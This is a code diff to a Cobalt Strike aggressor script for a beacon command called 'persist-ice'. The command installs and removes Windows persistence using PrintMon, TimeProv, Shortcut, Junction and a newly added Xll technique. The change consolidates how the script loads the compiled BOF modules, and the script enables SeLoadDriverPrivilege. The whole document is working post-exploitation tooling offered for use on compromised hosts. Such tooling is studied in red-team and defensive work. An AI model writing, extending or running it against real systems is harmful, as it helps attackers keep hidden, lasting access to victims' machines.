@@ -1,13 +1,13 @@
 beacon_command_register(
 "persist-ice", 
 "A set of persistence techniques to appeal the masses", 
-"Synopsis: persist-ice [PrintMon, TimeProv, Shortcut, Junction] [persist or clean] [key/folder name] [dll / lnk exe name]");
+"Synopsis: persist-ice [PrintMon, TimeProv, Shortcut, Junction, Xll] [persist or clean] [key/folder name] [dll / lnk exe name]");
 
 
 alias persist-ice {
     $data = substr($0, 12);
     @args = split(' ', $data); 
-	local('$_type $_action $_registryKeyName $_dllName $_action_int $_clsid');
+	local('$_type $_action $_registryKeyName $_dllName $_action_int $_clsid $_bofPath');
 
 	# map args to variables
 	$_type = @args[0];
@@ -50,14 +50,12 @@ alias persist-ice {
 		bgetprivs($1, "SeLoadDriverPrivilege");
 
 		# read in the right BOF file
-	    $handle = openf(script_resource("persist-ice-monitor.o"));
-	    $bof = readb($handle, -1);
-	    closef($handle);
-	    if(strlen($bof) < 1)
-		{
-			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
-			return;
-		}
+		$_bofPath = "persist-ice-monitor.o";
+
+	}
+		else if($_type iswm "Xll")
+	{
+		$_bofPath = "persist-ice-xll.o";
 	}
 	else if($_type iswm "TimeProv")
 	{
@@ -67,15 +65,7 @@ alias persist-ice {
 			berror($1,"Error: Must be admin for this persistence mechanism");
 			return;
 		}
-		# read in the right BOF file
-	    $handle = openf(script_resource("persist-ice-time.o"));
-	    $bof = readb($handle, -1);
-	    closef($handle);
-	    if(strlen($bof) < 1)
-		{
-			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
-			return;
-		}
+		$_bofPath = "persist-ice-time.o";
 	}
 	else if($_type iswm "Shortcut")
 	{
@@ -84,26 +74,12 @@ alias persist-ice {
 			berror($1,"Error: This function does not support automatic cleanup");
 			return;
 		}
+		$_bofPath = "persist-ice-shortcut.o";
 
-	    $handle = openf(script_resource("persist-ice-shortcut.o"));
-	    $bof = readb($handle, -1);
-	    closef($handle);
-	    if(strlen($bof) < 1)
-		{
-			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
-			return;
-		}
 	}
 		else if($_type iswm "Junction")
 	{
-	    $handle = openf(script_resource("persist-ice-junction.o"));
-	    $bof = readb($handle, -1);
-	    closef($handle);
-	    if(strlen($bof) < 1)
-		{
-			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
-			return;
-		}
+		$_bofPath = "persist-ice-junction.o";
 
 	}
 	else
@@ -111,8 +87,15 @@ alias persist-ice {
 			berror($1,"Error: Not a valid type of persistence");
 			return;
 	}
-
-
+#read in the correct bof
+	    $handle = openf(script_resource($_bofPath));
+	    $bof = readb($handle, -1);
+	    closef($handle);
+	    if(strlen($bof) < 1)
+		{
+			berror($1,"Error: BOF bin could not be found. Please ensure the compiled BOF (.o file) exists in the same folder as this aggressor script");
+			return;
+		}
      # pack our arguments
 
 	if(size(@args) > 4 )
